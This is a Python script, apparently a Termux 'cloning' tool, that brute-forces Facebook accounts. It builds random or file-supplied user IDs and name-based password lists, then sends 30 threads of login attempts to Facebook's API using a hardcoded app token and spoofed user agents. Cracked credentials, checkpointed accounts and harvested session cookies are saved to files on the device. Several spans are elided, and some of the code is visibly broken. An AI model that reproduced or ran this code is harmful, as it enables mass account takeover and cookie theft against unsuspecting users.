...
logo=("""\033[1;97m
             ...
             \033[1;35m .  ___   ___ ___  _   _  _  __  
              \033[1;35m/| | __| | o ) o \/ \ | \| ||  \ 
             \033[1;35m/o| | _|  | o \   / o || \\ || o )
            \033[1;35mL___||___| |___/_|\\_n_||_|\_||__/ 
                                   
                        
\033[1;37m  -----------------------⚔️------------------------
    
       \033[1;37mAUTHOR    🔰4R BRAND📌
       \033[1;37mFacebook  🔰H U Z I 📌
       \033[1;37mVersion   🔰0.6📌
...
def menu():
			clear()
		#	linex()
			print(' \033[1;34m[1] \033[1;37mFILE CLONING\n \033[1;34m[2] \033[1;37mRANDOM CLOINING\n \033[1;34m[3] \033[1;37mG-MAIL CLONING \n\033[1;34m [0] \033[1;37mExit menu')
			linex()
			xd=input(' Choose an option: ')
			if xd in ['1','01']:
				clear()
				print(' Put file example: \033[1;32m/sdcard/File.txt  etc..')
				linex()
				...
				try:
					...
					menu()
				clear()
				print(' ALL METHOD ARE UPDATED ')
				linex()
				print(' \033[1;34m[1] \033[1;37mMethod   \033[1;32m  \n\033[1;34m [2] \033[1;37mMethod  \033[1;32m   \n\033[1;34m [3]\033[1;37m Method\033[1;32m(BEST)\033[1;32m   \n\033[1;34m [4]\033[1;37m Method \033[1;32m \n \033[1;34m[5] \033[1;37mMethod  \033[1;32m  \n \033[1;34m[6] \033[1;37mMethod  \n \033[1;34m[7] \033[1;37mMethod  \n \033[1;34m[8] \033[1;37mMethod  ')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;37mUSE AIRPLANE MODE')
					linex()
					for user in fo:
...
def pak():
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[1;34mMethod   (best) \033[1;32m \n [2] \033[1;34mMethod   (v-fast)  \033[1;32m \n [3] \033[1;34mMethod   (v-best)  \033[1;32m \n [4] \033[1;34mMethod   (with cokies) \033[1;32m \n [5] \033[1;34mMethod   (slow)  \033[1;32m \n [6] \033[1;34mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;32m [1] \033[1;34mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;34m Clone with auto pass (best) \n\033[1;32m [3]\033[1;34m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;34mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;34mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;34mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;34mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;34mClone with auto pass (only-AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as HS:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					HS.submit(HS1,ids,passlist)
				if mthd in ['2','02']:
					HS.submit(HS2,ids,passlist)
				if mthd in ['3','03']:
					HS.submit(HS3,ids,passlist)
				if mthd in ['4','04']:
					HS.submit(HS4,ids,passlist)
				if mthd in ['5','05']:
					HS.submit(HS5,ids,passlist)
				if mthd in ['6','06']:
					HS.submit(HS6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' THE PROCESS HAS COMPLETED ')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
		...
		clear()
		print('\033[1;37m example: HANNAN,AHMED, HAMMAD, ALI\033[1;97m')
		linex()
		...
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;34mMethod   (best) \033[1;32m \n [2] \033[1;34mMethod   (v-fast)  \033[1;32m \n [3] \033[1;34mMethod   (v-best)  \033[1;32m \n [4] \033[1;34mMethod   (slow) \033[1;32m \n [5] \033[1;34mMethod   (slow)  \033[1;32m \n [6] \033[1;34mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [HS-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [HS-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HS-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [HS-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/HS-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/HS-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HS-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        #print("\r\r\033[1;34m Cookie: "+coki)
                                        open('/sdcard/HS-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HS-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HS-M3] %s|\033[1;37mOK:-%s \033[1;34m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/HUXII/HS-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUXII/HS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HS-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [HS-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HS-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [HS-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			HS=session.cookies.get_dict().keys()
			if "c_user" in HS:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [HS-OK] %s | %s'%(ids,pas))
				open('/sdcard/HS-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in HS:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [HS-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HS-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [HS-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [HS-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HS-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [HS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def HS2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [HS-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/HS-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [HS-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/HS-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def HS3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HS-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;34m Cookie: "+coki)
                                        #open('/sdcard/HS-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HS-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def HS4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HS-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/HS-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/HS-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
...
def HS6(ids,passlist):
    ...
    'sec-ch-ua': '"Edge";v="46", "Chromium";v="46", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.3.7 Mobile/15E148 Safari/605.1.15',
    'viewport-width': '1125',
}
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [HS-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [HS-OK] '+uid+' | '+pas)
						open('/sdcard/HS-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [HS-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/HS-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
